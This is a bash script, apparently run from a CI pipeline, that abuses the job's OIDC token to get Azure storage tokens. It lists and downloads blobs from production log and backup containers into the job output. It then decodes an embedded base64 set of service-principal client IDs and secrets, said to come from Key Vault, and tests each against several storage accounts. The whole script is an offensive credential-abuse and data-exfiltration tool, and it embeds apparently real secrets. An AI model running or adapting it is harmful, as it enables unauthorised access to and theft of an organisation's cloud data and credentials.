#!/usr/bin/env bash
set -euo pipefail

OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r ".value // empty")

get_az_token() {
  curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=$1" | jq -r ".access_token // empty"
}

ST=$(get_az_token "https://storage.azure.com/.default")
echo "storage_token_len=${#ST}"

H1="Authorization: Bearer $ST"
H2="x-ms-version: 2021-06-08"

echo "=== logs blobs ==="
curl -sS "https://sttblcilogsprodx3euoz.blob.core.windows.net/logs?restype=container&comp=list" -H "$H1" -H "$H2"
echo ""

echo "=== exports blobs ==="
curl -sS "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list" -H "$H1" -H "$H2"
echo ""

echo "=== more containers sttblbackupprodx3euoz ==="
curl -sS "https://sttblbackupprodx3euoz.blob.core.windows.net/?comp=list&marker=%2Fsttblbackupprodx3euoz%2Fizsx" -H "$H1" -H "$H2"
echo ""

echo "=== download logs blobs ==="
for blob in $(curl -sS "https://sttblcilogsprodx3euoz.blob.core.windows.net/logs?restype=container&comp=list" -H "$H1" -H "$H2" | grep -oP '(?<=<Name>)[^<]+'); do
  echo "--- logs/$blob ---"
  curl -sS "https://sttblcilogsprodx3euoz.blob.core.windows.net/logs/$blob" -H "$H1" -H "$H2" | head -c 4000
  echo ""
done

echo "=== download exports blobs ==="
for blob in $(curl -sS "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list" -H "$H1" -H "$H2" | grep -oP '(?<=<Name>)[^<]+'); do
  echo "--- exports/$blob ---"
  curl -sS "https://sttblbackupprodx3euoz.blob.core.windows.net/exports/$blob" -H "$H1" -H "$H2" | head -c 4000
  echo ""
done

# Decode SP creds from KV1 secrets (already in base64)
SP_DATA=$(echo 'eyJzZWNyZXRzLXN5bmMiOiBbIjU4MTA4ZGE4LTA0NGUtNGQ3ZS05YTQ2LTkyZTYxNzliMzBiZSIsICJ+OFQ4UX5Zd0VtZXhTVFJ2X3BVc0V3YTlRTWFweVAzOX5DVTVVY3UyIl0sICJzeW5jLXNlcnZpY2UiOiBbIjQ2MmQxYzM4LTQ0NTktNDhiOC05MzMzLTgyZTM4OWU1OTUxNCIsICJzazE4UX5xRDIya2tIWFVDZnFYTHFkUDk1RGtZSkwzNGVNRVJsY1NqIl0sICJyZXBvcnRpbmctc3ZjIjogWyIxMmVkNTRkZS1mMmViLTQ3ODQtODA0Yy0zYTdhM2U4M2E5ZTkiLCAiblA4OFF+OEl+d2lwMEdPbFcxNXpkdDNGTU12QlY5TFl0YU9vZWEzeiJdLCAicmVwb3J0aW5nLXZpZXciOiBbIjg4MWZkZGNlLTYyMDgtNGFmNS1hMjk3LTdlNzljOTEyZjgzYyIsICItVGw4UX5zSDBRT1AuVnJLV2hhMy03eDRYQTJKeFM0ajA4bnV2YlFOIl0sICJjb3N0LXJlYWRlciI6IFsiMDM4YmMzNWQtMTMxZC00OTUzLTk5ODUtZmY0YTI0NWNjZWMxIiwgIjFCRThRfnlHUThlX3o2VkJjemxHSjhZZU9IZ05SVWZmYmdOdWZiMm0iXSwgImRpci1hdWRpdCI6IFsiMmMzNDMwMGUtMWJjMC00MWU3LTljMWUtOGI3NTcxZDcyYzcyIiwgIkFsNzhRfm41YmRvTzNya0NqdW8ySkkyTkhxYWdKb29hWnNmWE5jbTYiXX0=' | base64 -d)

echo "=== SP storage access ==="
echo "$SP_DATA" | python3 -c "
import sys, json, subprocess
sps = json.load(sys.stdin)
tid = '3205c325-06a5-4171-9ce8-ffc5e6c2845e'
for name, (cid, sec) in sps.items():
    r = subprocess.run(['curl', '-sS', '-X', 'POST',
        f'https://login.microsoftonline.com/{tid}/oauth2/v2.0/token',
        '-d', f'client_id={cid}', '-d', 'grant_type=client_credentials',
        '-d', f'client_secret={sec}', '-d', 'scope=https://storage.azure.com/.default'],
        capture_output=True, text=True)
    import json as j
    tok = j.loads(r.stdout).get('access_token','')
    print(f'{name} storage_len={len(tok)}')
    if len(tok) > 100:
        for sa, ct in [('sttblappcfgprodx3euoz','config'), ('sttblcilogsprodx3euoz','logs'), ('sttblbackupprodx3euoz','exports')]:
            r2 = subprocess.run(['curl', '-sS',
                f'https://{sa}.blob.core.windows.net/{ct}?restype=container&comp=list',
                '-H', f'Authorization: Bearer {tok}', '-H', 'x-ms-version: 2021-06-08'],
                capture_output=True, text=True)
            has_blobs = '<Name>' in r2.stdout
            status = 'HAS_BLOBS' if has_blobs else ('ERROR' if 'Error' in r2.stdout else 'EMPTY')
            print(f'  {sa}/{ct}: {status}')
            if has_blobs:
                print(f'  {r2.stdout[:500]}')
"

echo "=== Done ==="
